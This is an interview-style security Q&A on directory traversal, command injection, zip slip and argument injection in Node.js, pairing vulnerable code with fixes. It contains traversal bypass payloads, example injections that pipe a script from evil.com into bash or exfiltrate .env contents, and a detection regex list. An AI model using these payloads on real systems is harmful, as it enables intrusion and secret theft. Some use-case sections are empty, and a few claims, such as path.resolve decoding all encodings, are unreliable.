# Security: Directory Traversal & Command Injection — Interview Q&A (5 YOE Level)

---

## Section 1: Directory Traversal — Fundamentals

**Q1. What is directory traversal, what OS primitive does it exploit, and what is the canonical vulnerable code pattern in Node.js?**
A: Directory traversal (also called path traversal) exploits the OS filesystem's treatment of `../` (dot-dot-slash) as "go up one directory level." When an application constructs a filesystem path using caller-supplied input without sanitizing `../` sequences, the attacker escapes the intended directory and reads or writes arbitrary files anywhere the process has permission to access.

The OS primitive being abused:
```
/var/app/uploads/../../../etc/passwd
  resolves to → /etc/passwd

/var/app/uploads/../../../../proc/self/environ
  resolves to → /proc/self/environ  (environment variables, potential secrets)

/var/app/uploads/..%2F..%2F..%2Fetc%2Fshadow
  URL-decoded → /var/app/uploads/../../../etc/shadow
  resolves to → /etc/shadow
```

Canonical vulnerable Node.js pattern:
```typescript
// VULNERABLE — constructs path from user-supplied filename
import path from 'path';
import fs   from 'fs';

app.get('/files/:filename', (req, res) => {
  const filePath = path.join('/var/app/uploads', req.params.filename);
  // req.params.filename = '../../etc/passwd'
  // filePath = '/var/app/uploads/../../etc/passwd' → resolves to /etc/passwd

  const content = fs.readFileSync(filePath);
  res.send(content);
});

// Attacker requests:
// GET /files/../../etc/passwd          → reads /etc/passwd
// GET /files/../../etc/shadow          → reads /etc/shadow (if process has perms)
// GET /files/../../proc/self/environ   → reads environment variables
// GET /files/../../app/config/.env     → reads application secrets
```

The bug: `path.join()` normalizes the path — it resolves `..` segments correctly, producing the final absolute path — but it does NOT prevent escape from the intended base directory. Joining `/var/app/uploads` with `../../etc/passwd` yields `/etc/passwd` cleanly. The function works as documented; the mistake is trusting caller-supplied segments without checking the result stays within bounds.

**Q2. What are all the encoding and bypass variants an attacker uses to evade naive directory traversal filters?**
A: Naive filters check for literal `../` strings and can be bypassed with encoding, case variation, and Unicode tricks. Any server-side filter must normalize before checking — not check before normalizing:

**URL encoding:**
```
../          standard
%2e%2e%2f    URL-encoded dot-dot-slash
%2e%2e/      partially encoded
..%2f        partially encoded (slash only)
%2e%2e%5c    dot-dot-backslash (Windows: \ == path separator)
..%5c        partially encoded backslash
```

**Double encoding (when the server decodes twice):**
```
%252e%252e%252f   → decoded once: %2e%2e%2f → decoded again: ../
%252e%252e/       → decoded once: %2e%2e/   → decoded again: ../
```

**Unicode / UTF-8 overlong encoding (legacy servers):**
```
..%c0%af       overlong UTF-8 for /  (CVE pattern in old Tomcat, IIS)
..%ef%bc%8f    Unicode fullwidth solidus ／ (U+FF0F)
```

**Null byte injection (languages where strings are null-terminated):**
```
../../etc/passwd%00.jpg
→ In C-based file functions: string terminates at %00 → reads /etc/passwd
→ The .jpg suffix satisfies a naive extension check
→ Not applicable to modern Node.js (JS strings are not null-terminated)
  but appears in PHP and legacy C extensions
```

**Windows-specific:**
```
..\..\..\windows\system32\drivers\etc\hosts   backslash separator
..\..\boot.ini                                 Windows path
/var/app/../../../windows/win.ini              mixed separators
```

**Filter bypass via redundant sequences:**
```
....//          if filter strips ../ once: ....// → ../ (double ../ merged)
....\/          mixed separator after strip
..././          dot-dot-dot-slash construction
```

The correct defense is never a string-matching filter. It is: resolve the full path first using the OS normalizer (`path.resolve()`), then check whether the resolved path starts with the allowed base directory prefix. No amount of encoding survives `path.resolve()` — the OS normalizer handles all encoding and `..` traversal, and the result is always a clean absolute path to check:

```typescript
// Correct defense — resolve first, check after
const base = '/var/app/uploads';
const resolved = path.resolve(base, userInput);

if (!resolved.startsWith(base + path.sep)) {
  throw new ForbiddenException('Path traversal detected');
}
// Now safe to use resolved
```

**Q3. What are the five file targets that make directory traversal a critical-severity finding in a fintech environment?**
A: Severity depends on what the process can read. On a Linux server hosting a Node.js fintech API, the highest-value targets:

**Target 1 — Application secrets (`/app/.env`, `/app/config/*.json`):**
```
../../app/.env
→ DATABASE_URL=postgres://user:password@rds.myorg.internal/prod
→ JWT_SECRET=...
→ RAZORPAY_KEY_SECRET=...
→ AWS_SECRET_ACCESS_KEY=...
One .env read → full database access, forged JWTs, payment gateway control.
```

**Target 2 — AWS EC2 instance metadata (via SSRF sibling, but also accessible as a file in some configurations):**
```
/proc/self/environ
→ AWS_CONTAINER_CREDENTIALS_RELATIVE_URI, AWS_ACCESS_KEY_ID
→ If ECS task: credentials endpoint URL embedded in environment
```

**Target 3 — `/proc/self/environ` and `/proc/self/cmdline`:**
```
/proc/self/environ → all environment variables of the running process
/proc/self/cmdline → command used to start the process (may include secrets passed as args)
/proc/self/fd/     → open file descriptors (can read open database socket buffers in some configs)
```

**Target 4 — SSH and TLS private keys:**
```
/root/.ssh/id_rsa            → SSH private key for root (if process runs as root)
/home/deploy/.ssh/id_rsa     → deploy user's SSH key → server-to-server access
/etc/ssl/private/server.key  → TLS private key → decrypt recorded traffic
```

**Target 5 — Application source code and compiled artifacts:**
```
../../app/src/auth/jwt.strategy.ts → reveals token validation logic, secret names
../../app/dist/main.js             → compiled production code → full logic review
→ Black-box becomes white-box: attacker reads the source to find next vulnerability
```

In a Docker container, traversal is limited to the container filesystem — but that filesystem contains the application code, its secrets, and often mounted volumes. Container isolation does not prevent directory traversal within the container's filesystem.

## Section 2: Directory Traversal — Fixes and Prevention

**Q4. Write the complete, production-safe file-serving implementation in Node.js that prevents all directory traversal variants.**
A: The implementation has four layers: path resolution, boundary check, allowlist validation, and safe streaming:

```typescript
import path    from 'path';
import fs      from 'fs';
import crypto  from 'crypto';
import {
  BadRequestException,
  ForbiddenException,
  NotFoundException,
  Injectable,
} from '@nestjs/common';

@Injectable()
export class FileService {
  // Immutable base directory — resolved at startup, not per-request
  private readonly UPLOAD_BASE = path.resolve('/var/app/uploads');

  // Allowlist: only these extensions are servable
  private readonly ALLOWED_EXTENSIONS = new Set(['.pdf', '.jpg', '.jpeg', '.png']);

  // Max filename length — prevents path length attacks
  private readonly MAX_FILENAME_LENGTH = 255;

  async serveFile(userFilename: string, requestingUserId: string): Promise<Buffer> {
    // Layer 1 — Input sanity checks (cheap, fail fast)
    if (!userFilename || typeof userFilename !== 'string') {
      throw new BadRequestException('Invalid filename');
    }

    if (userFilename.length > this.MAX_FILENAME_LENGTH) {
      throw new BadRequestException('Filename too long');
    }

    // Layer 2 — Extension allowlist (before path resolution — lightweight guard)
    const ext = path.extname(userFilename).toLowerCase();
    if (!this.ALLOWED_EXTENSIONS.has(ext)) {
      throw new ForbiddenException('File type not permitted');
    }

    // Layer 3 — Path resolution and boundary check (THE critical security control)
    // path.resolve() handles ALL encoding variants, ../ sequences, mixed separators
    const resolvedPath = path.resolve(this.UPLOAD_BASE, userFilename);

    // Boundary check: resolved path MUST start with the base directory
    // path.sep appended to base prevents partial prefix match:
    //   base = '/var/app/uploads'
    //   resolved = '/var/app/uploads-evil/secret.pdf'
    //   startsWith('/var/app/uploads') → true (BUG without the sep)
    //   startsWith('/var/app/uploads/') → false (correct)
    if (!resolvedPath.startsWith(this.UPLOAD_BASE + path.sep)) {
      // Log as a security event — this is never a benign request
      this.securityLogger.warn({
        event:           'DIRECTORY_TRAVERSAL_ATTEMPT',
        userFilename,
        resolvedPath,
        requestingUserId,
      });
      throw new ForbiddenException('Access denied');
    }

    // Layer 4 — Authorization: does this user own this file?
    // Never rely on the path alone for ownership — check the database
    const fileRecord = await this.fileRepo.findOne({
      where: { storagePath: resolvedPath, ownerId: requestingUserId },
    });
    if (!fileRecord) {
      // Return 404 — don't reveal whether the file exists (prevents enumeration)
      throw new NotFoundException('File not found');
    }

    // Layer 5 — Safe read with existence check
    try {
      await fs.promises.access(resolvedPath, fs.constants.R_OK);
    } catch {
      throw new NotFoundException('File not found');
    }

    return fs.promises.readFile(resolvedPath);
  }

  // Safe filename generation for stored uploads — never use user-supplied filenames
  generateStorageFilename(originalName: string, userId: string): string {
    const ext      = path.extname(originalName).toLowerCase();
    const randomId = crypto.randomBytes(16).toString('hex');
    // Storage filename is opaque — userId cannot be derived from it
    return `${randomId}${ext}`;
    // Never: return originalName (stores user-controlled filename)
    // Never: return `${userId}-${originalName}` (user controls part of path)
  }
}
```

**Q5. How do you handle file uploads securely to prevent both directory traversal on write paths and malicious file content?**
A: Write-path traversal is often overlooked — most attention goes to read paths. An attacker who controls the filename on upload can write files outside the intended directory, overwrite configuration files, or plant web shells:

```typescript
import multer  from 'multer';
import crypto  from 'crypto';
import path    from 'path';
import { Request } from 'express';

// VULNERABLE upload — trusts the original filename
const vulnerableStorage = multer.diskStorage({
  destination: '/var/app/uploads',
  filename: (req, file, cb) => {
    cb(null, file.originalname); // ← NEVER do this
    // originalname = '../../app/config/database.json'
    // File written to /var/app/uploads/../../app/config/database.json
    //              = /var/app/config/database.json → overwrites config
  },
});

// SAFE upload — completely replaces user-supplied filename
const safeStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    // Base directory is hardcoded — never from user input
    cb(null, '/var/app/uploads');
  },
  filename: (req, file, cb) => {
    // Generated filename: cryptographically random, only keeps the extension
    const ext        = path.extname(file.originalname).toLowerCase();
    const safeName   = `${crypto.randomBytes(16).toString('hex')}${ext}`;
    cb(null, safeName);
    // Original filename is stored in DB for display — never used for storage path
  },
});

// File validation — MIME type + magic bytes + size
const upload = multer({
  storage: safeStorage,
  limits: {
    fileSize: 10 * 1024 * 1024,  // 10MB per file
    files: 5,                     // Max 5 files per request
    fields: 10,                   // Max 10 non-file fields
  },
  fileFilter: (req: Request, file: Express.Multer.File, cb: multer.FileFilterCallback) => {
    // Layer 1: MIME type check (easy to spoof — necessary but not sufficient)
    const allowedMimeTypes = new Set([
      'application/pdf',
      'image/jpeg',
      'image/png',
    ]);
    if (!allowedMimeTypes.has(file.mimetype)) {
      return cb(new BadRequestException('File type not allowed'));
    }
    cb(null, true);
  },
});

// Layer 2: Magic bytes validation after upload (cannot be spoofed via headers)
// Run post-upload because multer buffers or streams; magic bytes need actual content
async function validateMagicBytes(filePath: string, declaredType: string): Promise<void> {
  const fd     = await fs.promises.open(filePath, 'r');
  const buffer = Buffer.alloc(8);
  await fd.read(buffer, 0, 8, 0);
  await fd.close();

  const signatures: Record<string, Buffer[]> = {
    'application/pdf': [Buffer.from([0x25, 0x50, 0x44, 0x46])], // %PDF
    'image/jpeg':      [Buffer.from([0xFF, 0xD8, 0xFF])],
    'image/png':       [Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])],
  };

  const validSignatures = signatures[declaredType];
  const isValid = validSignatures?.some(sig => buffer.slice(0, sig.length).equals(sig));

  if (!isValid) {
    await fs.promises.unlink(filePath); // Delete the invalid file
    throw new BadRequestException('File content does not match declared type');
  }
}
```

The three rules for safe file storage:
1. **Never use the user-supplied filename as the storage path** — generate an opaque random filename.
2. **Store the original filename in the database** for display, never for path construction.
3. **Validate magic bytes, not just MIME type** — MIME type is caller-controlled; magic bytes are in the file content.

## Section 3: Command Injection — Fundamentals

**Q6. What is command injection, what shell behavior does it exploit, and how does it differ from directory traversal?**
A: Command injection occurs when an application constructs a shell command using caller-supplied data and passes it to a shell interpreter. The shell interpreter parses the command — including shell metacharacters — before executing it. An attacker who controls part of the command string can inject metacharacters that alter the command's meaning, appending or substituting arbitrary commands.

The shell behavior being abused — metacharacter parsing:
```
Shell metacharacters and their effect:
  ;    command separator  → cmd1; cmd2 (executes both)
  &&   AND operator       → cmd1 && cmd2 (cmd2 runs if cmd1 succeeds)
  ||   OR operator        → cmd1 || cmd2 (cmd2 runs if cmd1 fails)
  |    pipe               → cmd1 | cmd2 (output of cmd1 piped to cmd2)
  `    backtick           → `cmd` (command substitution — output replaces expression)
  $()  substitution       → $(cmd) (same as backtick, modern syntax)
  >    redirect           → cmd > file (write output to file)
  >>   append redirect    → cmd >> file
  <    input redirect     → cmd < file
  &    background         → cmd & (run in background)
  *    glob               → * (expands to all files in current dir)
  ?    single glob        → ? (matches any single character in filename)
  \n   newline            → treated as command separator in many contexts
```

How it differs from directory traversal:

```
Directory Traversal:
  Vector:   filesystem path manipulation
  Impact:   read/write arbitrary files
  Mechanism: OS path resolution interprets ../
  Requires: application reads/writes files using user input as path component

Command Injection:
  Vector:   shell metacharacter injection into executed commands
  Impact:   arbitrary code execution on the server (RCE)
  Mechanism: shell interpreter parses injected metacharacters
  Requires: application passes user input to a shell (exec, spawn with shell:true, etc.)
  Severity: higher — full RCE vs. file read/write
```

Command injection = Remote Code Execution. It is the highest-severity injection class for backend APIs. An attacker who achieves command injection can: exfiltrate all data, install persistent backdoors, pivot to other services via network, delete all data, or mine cryptocurrency on the server.

**Q7. What is the canonical vulnerable command injection pattern in Node.js, and what are the five most exploitable real-world use cases that create this pattern?**
A: The canonical pattern — user input concatenated into a string passed to `child_process.exec()`:

```typescript
import { exec } from 'child_process';

// VULNERABLE — user input directly in shell command string
app.post('/api/convert-pdf', (req, res) => {
  const filename = req.body.filename; // Attacker controls this

  exec(`convert /uploads/${filename} /outputs/${filename}.pdf`, (err, stdout) => {
    if (err) return res.status(500).send(err.message);
    res.send({ output: stdout });
  });
});

// Attacker sends: filename = "file.jpg; curl https://evil.com/shell.sh | bash"
// Executed command: convert /uploads/file.jpg; curl https://evil.com/shell.sh | bash
//                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//                                              This executes — reverse shell installed

// Attacker sends: filename = "file.jpg && cat /etc/passwd > /var/app/public/leaked.txt"
// Executed: convert /uploads/file.jpg && cat /etc/passwd > /var/app/public/leaked.txt
// /etc/passwd is now publicly accessible via the web server
```

**Real-world use cases that generate this pattern:**

**Use case 1 — File format conversion (ImageMagick, ffmpeg, LibreOffice):**


**Use case 2 — PDF generation from HTML (wkhtmltopdf, puppeteer CLI):**

**Use case 4 — Network diagnostic tools exposed as APIs:**

## Section 4: Command Injection — Fixes and Prevention

**Q8. What is the difference between `child_process.exec()` and `child_process.execFile()` / `spawn()`, and why does the distinction eliminate command injection?**
A: `exec()` passes the command to `/bin/sh -c` — the shell interpreter parses it. `execFile()` and `spawn()` with `shell: false` (the default) bypass the shell entirely — the OS `execve()` syscall is called directly with the program path and an array of arguments:

```typescript
import { exec, execFile, spawn } from 'child_process';

// exec() — passes to /bin/sh -c → shell parses metacharacters
exec(`convert ${userInput} output.pdf`);
// The shell sees: convert file.jpg; rm -rf / output.pdf
// Shell parses the ; and executes both commands

// execFile() — no shell; argv array; no metacharacter parsing
execFile('convert', [userInput, 'output.pdf'], (err, stdout) => {
  // convert is called directly as: execve('/usr/bin/convert', ['convert', userInput, 'output.pdf'])
  // Shell is never invoked
  // userInput = 'file.jpg; rm -rf /' is passed as a LITERAL argument to convert
  // convert tries to open a file literally named 'file.jpg; rm -rf /' → fails safely
});

// spawn() — same security property as execFile(), plus streaming
const proc = spawn('convert', [userInput, 'output.pdf'], {
  shell: false, // DEFAULT — explicit for clarity
});
// shell: true would make spawn() as vulnerable as exec()
```

The mechanism: when `shell: false`, Node.js calls `libuv`'s `uv_spawn`, which calls `fork()` + `execve()`. `execve()` receives the program path and an `argv` array. The kernel loads the program directly without invoking any shell. Metacharacters in `argv[1]` are never interpreted — they are passed verbatim as arguments to the target program. A program that doesn't interpret shell metacharacters (like `convert`, `ffmpeg`, `ping`) will treat the malicious input as a literal argument value and either reject it or fail harmlessly.

```typescript
// Complete safe wrapper for all child_process usage
import { execFile, ExecFileOptions } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

async function safeConvert(
  inputPath: string,
  outputPath: string,
): Promise<string> {
  // inputPath and outputPath already validated by path boundary check (Q4)
  // They are absolute paths within allowed directories

  const options: ExecFileOptions = {
    timeout:   30_000,        // 30s max — prevents runaway processes
    maxBuffer: 10 * 1024 * 1024, // 10MB stdout buffer cap
    env: {                    // Minimal environment — don't inherit full process.env
      PATH: '/usr/bin:/usr/local/bin',
    },
    uid: 65534,               // Run as nobody — minimal privilege
    gid: 65534,
  };

  try {
    const { stdout } = await execFileAsync(
      '/usr/bin/convert',
      [inputPath, '-resize', '800x600', outputPath],
      options,
    );
    return stdout;
  } catch (err: any) {
    // Never return raw error message — may contain internal paths
    throw new InternalServerErrorException('File conversion failed');
  }
}
```

**Q9. What if you genuinely need a shell for complex operations — how do you use argument escaping safely, and what library provides it?**
A: The correct answer is: avoid the shell. Almost every operation that seems to require a shell (`pipe`, `&&`, globbing) can be decomposed into multiple `execFile()` / `spawn()` calls connected by Node.js streams and logic — without involving `/bin/sh`. But when you cannot avoid the shell (legacy scripts, complex pipelines that are impractical to rewrite), use `shell-quote` or manual escaping as a mitigation — never as a primary defense:

```typescript
// The shell-quote library — wraps arguments for safe shell embedding
import { quote } from 'shell-quote';

// STILL NOT RECOMMENDED — escaping can have edge cases; execFile is always safer
// Use only when execFile truly cannot achieve the operation

const safeArg = quote([userInput]); // Wraps in quotes, escapes metacharacters
exec(`legacy-script.sh ${safeArg} /output`);

// What quote() does:
// quote(['file.jpg'])              → "'file.jpg'"
// quote(["file'; rm -rf /"])       → "'file'\\'' rm -rf /'"  (escapes the single quote)
// quote(['$(rm -rf /)'])           → "'$(rm -rf /)'"         (literal, not substituted)
```

For complex pipelines specifically, use Node.js stream piping:

```typescript
// INSTEAD OF: exec('pdftotext file.pdf - | grep "ACCOUNT" | head -20')
// Use Node.js native piping — no shell required

import { spawn } from 'child_process';

async function extractAccountLines(pdfPath: string): Promise<string[]> {
  // Validate pdfPath against boundary before use (Q4 pattern)

  // pdftotext writes to stdout
  const pdftotext = spawn('pdftotext', [pdfPath, '-'], { shell: false });

  // Collect stdout in Node.js, then process in JS — no grep/head needed
  const chunks: Buffer[] = [];
  pdftotext.stdout.on('data', chunk => chunks.push(chunk));

  await new Promise((resolve, reject) => {
    pdftotext.on('close', resolve);
    pdftotext.on('error', reject);
  });

  const text = Buffer.concat(chunks).toString('utf8');

  // grep and head replaced by native JS operations — no shell
  return text
    .split('\n')
    .filter(line => line.includes('ACCOUNT'))
    .slice(0, 20);
}
```

This pattern eliminates the shell entirely. Each process is spawned directly. Data flows through Node.js streams or is collected in-process. The complex pipeline logic is in JavaScript. No shell metacharacters are ever parsed.

**Q10. How do you detect command injection attempts in incoming requests, and what should happen when one is detected?**
A: Detection at the application layer is a defense-in-depth measure — the primary defense is never constructing shell commands from user input. But logging and alerting on injection attempts provides threat intelligence and incident response triggers:

```typescript
// Command injection pattern detector
const COMMAND_INJECTION_PATTERNS = [
  /[;&|`$]/, // Core shell metacharacters
  /\$\(.*\)/, // Command substitution $()
  /`[^`]*`/,  // Backtick substitution
  /\|\|/,     // OR operator
  /&&/,       // AND operator
  />{1,2}/,   // Redirect operators
  /<(?!DOCTYPE|html|\/)/i, // Input redirect (excluding HTML tags)
  /\n|\r/,    // Newline injection
  /\0/,       // Null byte
  /eval\s*\(/, // eval() in input (for XSS-adjacent contexts)
  /exec\s*\(/, // exec() string
];

function detectCommandInjection(input: string): boolean {
  return COMMAND_INJECTION_PATTERNS.some(pattern => pattern.test(input));
}

// Middleware: log and potentially reject suspicious inputs
@Injectable()
export class InjectionDetectionMiddleware implements NestMiddleware {
  use(req: Request, res: Response, next: NextFunction) {
    const suspiciousFields: string[] = [];

    // Check common input locations
    const valuesToCheck = [
      ...Object.values(req.query   ?? {}),
      ...Object.values(req.params  ?? {}),
      ...this.flattenObject(req.body ?? {}),
    ].filter(v => typeof v === 'string') as string[];

    for (const value of valuesToCheck) {
      if (detectCommandInjection(value)) {
        suspiciousFields.push(value.substring(0, 100)); // Log first 100 chars only
      }
    }

    if (suspiciousFields.length > 0) {
      this.securityLogger.warn({
        event:       'COMMAND_INJECTION_ATTEMPT',
        ip:          req.ip,
        userId:      req.user?.userId,
        path:        req.path,
        method:      req.method,
        patterns:    suspiciousFields,
        userAgent:   req.headers['user-agent'],
        timestamp:   new Date().toISOString(),
      });

      // Option A: Reject immediately (high confidence, low false-positive context)
      // throw new BadRequestException('Invalid characters in request');

      // Option B: Log and continue (monitor before blocking — avoids false positives)
      // next();

      // Option C: Alert security team and add to watchlist
      this.alerting.raise('injection_attempt', { ip: req.ip, userId: req.user?.userId });
    }

    next();
  }

  private flattenObject(obj: Record<string, any>, depth = 0): string[] {
    if (depth > 5) return []; // Prevent stack overflow on deeply nested objects
    return Object.values(obj).flatMap(v =>
      typeof v === 'string' ? [v] :
      typeof v === 'object' && v !== null ? this.flattenObject(v, depth + 1) :
      []
    );
  }
}
```

## Section 5: Real-World Patterns and Fintech-Specific Scenarios

**Q11. How does zip slip combine directory traversal with archive handling, and how do you prevent it in Node.js?**
A: Zip slip is a directory traversal vulnerability specific to archive extraction. Archive formats (ZIP, TAR, JAR) allow entry names to contain path components, including `../`. When naively extracted, these paths resolve relative to the extraction directory — allowing files to be written anywhere the process has write permission:

```
Archive: malicious.zip
  Contents:
    normal_file.txt              → extracts to /tmp/extracted/normal_file.txt  ✓
    ../../app/.env               → extracts to /app/.env                        ✗ traversal
    ../../etc/cron.d/backdoor    → extracts to /etc/cron.d/backdoor             ✗ RCE via cron

This was a real CVE affecting thousands of libraries across Java, Python, Go, Ruby, .NET.
In Node.js: adm-zip, node-tar, unzipper (older versions) were affected.
```

Safe extraction implementation using the boundary-check pattern:

```typescript
import AdmZip   from 'adm-zip';
import path     from 'path';
import fs       from 'fs';
import crypto   from 'crypto';

async function safeExtract(
  zipPath: string,
  extractionBase: string,
  requestingUserId: string,
): Promise<string[]> {
  // Validate zipPath is within allowed uploads directory (Q4 pattern)
  const resolvedZip = path.resolve('/var/app/uploads', zipPath);
  if (!resolvedZip.startsWith('/var/app/uploads' + path.sep)) {
    throw new ForbiddenException('Invalid zip path');
  }

  const zip = new AdmZip(resolvedZip);
  const entries = zip.getEntries();

  // Create a unique subdirectory for this extraction — prevents collisions
  const extractionId = crypto.randomBytes(16).toString('hex');
  const targetDir    = path.resolve(extractionBase, extractionId);
  await fs.promises.mkdir(targetDir, { recursive: true });

  const extractedPaths: string[] = [];

  for (const entry of entries) {
    if (entry.isDirectory) continue; // Skip directory entries

    // THE CRITICAL CHECK: resolve the entry path and verify it stays within targetDir
    const entryPath    = entry.entryName;
    const resolvedPath = path.resolve(targetDir, entryPath);

    if (!resolvedPath.startsWith(targetDir + path.sep)) {
      // Zip slip attempt — log as security event and abort entire extraction
      this.securityLogger.error({
        event:           'ZIP_SLIP_ATTEMPT',
        entryName:       entryPath,
        resolvedPath,
        requestingUserId,
        zipFile:         resolvedZip,
      });
      // Clean up partially extracted files
      await fs.promises.rm(targetDir, { recursive: true, force: true });
      throw new ForbiddenException('Malicious archive detected');
    }

    // Validate the entry extension
    const ext = path.extname(entryPath).toLowerCase();
    if (!['.pdf', '.jpg', '.png', '.txt'].includes(ext)) {
      continue; // Skip disallowed file types within the archive
    }

    // Safe to extract this entry
    await fs.promises.mkdir(path.dirname(resolvedPath), { recursive: true });
    await fs.promises.writeFile(resolvedPath, entry.getData());
    extractedPaths.push(resolvedPath);
  }

  return extractedPaths;
}
```

**Q12. A fintech service runs a shell script to generate NACH mandate PDFs, passing the customer name and account number to the script. How do you make this safe?**
A: This is the most direct fintech-specific command injection scenario. NACH (National Automated Clearing House) mandate generation typically involves a templating script or PDF library invoked with customer data. The correct transformation:

```typescript
// VULNERABLE — customer name and account number injected into shell command
app.post('/api/nach/generate-mandate', async (req, res) => {
  const { customerName, accountNumber, ifscCode } = req.body;

  exec(
    `./scripts/generate_mandate.sh "${customerName}" "${accountNumber}" "${ifscCode}"`,
    (err, stdout) => res.send(stdout),
  );
  // customerName = 'Amit Kumar"; curl https://evil.com/exfil?data=$(cat /app/.env) #'
  // Full env exfiltration via command injection
});

// SAFE — three transformations applied

// Transformation 1: Validate inputs strictly before any processing
function validateMandateInputs(name: string, account: string, ifsc: string): void {
  // Customer name: only letters, spaces, dots, hyphens — no shell metacharacters
  if (!/^[A-Za-z\s.\-]{1,100}$/.test(name)) {
    throw new BadRequestException('Invalid customer name format');
  }
  // Account number: digits only
  if (!/^\d{9,18}$/.test(account)) {
    throw new BadRequestException('Invalid account number format');
  }
  // IFSC: standard format — 4 letters, 0, 6 alphanumeric
  if (!/^[A-Z]{4}0[A-Z0-9]{6}$/.test(ifsc)) {
    throw new BadRequestException('Invalid IFSC format');
  }
}

// Transformation 2: Use execFile — no shell, arguments passed as array
import { execFile } from 'child_process';
import { promisify } from 'util';
const execFileAsync = promisify(execFile);

app.post('/api/nach/generate-mandate', async (req, res) => {
  const { customerName, accountNumber, ifscCode, userId } = req.body;

  validateMandateInputs(customerName, accountNumber, ifscCode);

  try {
    const { stdout } = await execFileAsync(
      '/app/scripts/generate_mandate.sh',
      // Arguments as array — shell never invoked — metacharacters are literals
      [customerName, accountNumber, ifscCode],
      {
        timeout:   15_000,
        maxBuffer: 5 * 1024 * 1024,
        env: { PATH: '/usr/bin:/bin' },
        uid: 65534, // nobody
        gid: 65534,
      },
    );

    res.json({ mandateId: parseOutputId(stdout) });
  } catch (err) {
    throw new InternalServerErrorException('Mandate generation failed');
  }
});

// Transformation 3 (best): eliminate the shell script entirely
// Use a Node.js PDF library (pdfkit, puppeteer, jspdf) to generate the mandate
// — no subprocess, no shell, no injection surface at all
import PDFDocument from 'pdfkit';

async function generateNachMandate(
  customerName: string,
  accountNumber: string,
  ifscCode: string,
): Promise<Buffer> {
  // After validateMandateInputs() — data is safe, consists only of known-safe chars
  return new Promise((resolve, reject) => {
    const doc = new PDFDocument();
    const chunks: Buffer[] = [];

    doc.on('data',  chunk => chunks.push(chunk));
    doc.on('end',   ()    => resolve(Buffer.concat(chunks)));
    doc.on('error', reject);

    doc.fontSize(12)
       .text(`Account Holder: ${customerName}`)   // Sanitized — letters/spaces only
       .text(`Account Number: ${accountNumber}`)   // Sanitized — digits only
       .text(`IFSC Code: ${ifscCode}`)             // Sanitized — known format
       .end();
  });
}
```

The progression: inject → escape → execFile (no shell) → eliminate subprocess entirely. Each step is safer than the previous. The final form — a native PDF library — has zero injection surface because no external process is involved.

**Q13. What is argument injection, and how does it differ from command injection while still being exploitable?**
A: Argument injection occurs when user input is passed as an argument to a program (via `execFile` or `spawn`) but the program itself interprets certain argument patterns as flags or options — not just data. The shell is not involved, but the target program's argument parser is abused:

```typescript
// No shell used — looks safe. But argument injection is still possible.
execFile('git', ['clone', userRepoUrl, '/tmp/repo'], { shell: false });

// Git interprets arguments starting with -- as options
// userRepoUrl = '--upload-pack=malicious-script /tmp/repo'
// git clone --upload-pack=malicious-script /tmp/repo /tmp/repo
// --upload-pack specifies the remote upload-pack program → RCE

// Similar patterns in other tools:
execFile('curl', ['--url', userUrl, '-o', outputPath], { shell: false });
// userUrl = '--config=/app/.env' → curl reads config from .env → exfiltrates secrets

execFile('rsync', [userSource, destination], { shell: false });
// userSource = '-e "ssh -o ProxyCommand=malicious-cmd"' → RCE via rsync

execFile('tar', ['-xzf', userFile, '-C', extractDir], { shell: false });
// Not argument injection per se, but zip slip (Q11) — content controls paths
```

Defenses against argument injection:

```typescript
// Defense 1 — Use -- to signal end of options for programs that support it
// Everything after -- is treated as a positional argument, not a flag
execFile('git', ['clone', '--', userRepoUrl, '/tmp/repo'], { shell: false });
// -- prevents userRepoUrl from being interpreted as a git option

execFile('grep', ['--', userPattern, filePath], { shell: false });
// -- prevents userPattern starting with - from being treated as a grep flag

// Defense 2 — Allowlist the allowed argument forms before passing
function validateRepoUrl(url: string): void {
  // Only allow https:// URLs — not git://, ext::, or paths that start with -
  if (!/^https:\/\/[a-zA-Z0-9.\-]+\/.+\.git$/.test(url)) {
    throw new BadRequestException('Invalid repository URL format');
  }
}

// Defense 3 — Use the library binding instead of the CLI
// npm packages: simple-git (git operations), nodemailer (email)
// These call the underlying library functions, not the CLI
// No subprocess, no argument parsing, no injection surface
import simpleGit from 'simple-git';

const git = simpleGit('/tmp');
await git.clone(validatedRepoUrl, '/tmp/repo');
// simple-git uses libgit2 or constructs execFile calls safely internally
```

## Section 6: Defense-in-Depth and Infrastructure Controls

**Q14. Beyond application-level fixes, what OS and infrastructure controls reduce the impact of a successful directory traversal or command injection?**
A: Defense-in-depth assumes a vulnerability will be exploited despite application-level controls. Infrastructure controls limit the blast radius:

**Control 1 — Principle of least privilege for the process user:**
```bash
# Never run the Node.js application as root
# Create a dedicated low-privilege user
useradd --system --no-create-home --shell /bin/false appuser

# In Docker:
FROM node:20-alpine
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser
# Process can only read/write files owned by or readable by appuser
# /etc/shadow, /root/.ssh/id_rsa → not readable by appuser
```

**Control 2 — Read-only filesystem where possible:**
```dockerfile
# Docker: mark filesystem layers read-only; only allow writes to specific volumes
docker run --read-only \
  --tmpfs /tmp:size=100m \
  --tmpfs /var/app/uploads:size=1g \
  myapp:latest

# Kubernetes:
securityContext:
  readOnlyRootFilesystem: true
  runAsNonRoot: true
  runAsUser: 65534  # nobody
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]
```

**Control 3 — seccomp / AppArmor profiles:**
```json
// seccomp profile: whitelist only syscalls the Node.js app legitimately needs
// Blocks execve() — prevents command injection from executing subprocesses
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    { "names": ["read", "write", "open", "close", "stat", "fstat",
                "mmap", "mprotect", "brk", "futex", "clone", "wait4",
                "socket", "connect", "accept", "bind", "listen",
                "epoll_create", "epoll_ctl", "epoll_wait", "pipe"],
      "action": "SCMP_ACT_ALLOW" }
    // execve NOT in the list → command injection subprocess attempt fails
    // at the kernel level even if application code calls exec()
  ]
}
```

**Control 4 — Network egress restrictions:**
```hcl
# Terraform: security group that blocks all outbound except specific destinations
resource "aws_security_group_rule" "app_egress_db" {
  type        = "egress"
  from_port   = 5432
  to_port     = 5432
  protocol    = "tcp"
  source_security_group_id = aws_security_group.rds.id
  security_group_id        = aws_security_group.app.id
}
# No egress to 0.0.0.0/0 → command injection `curl evil.com` → blocked at network level
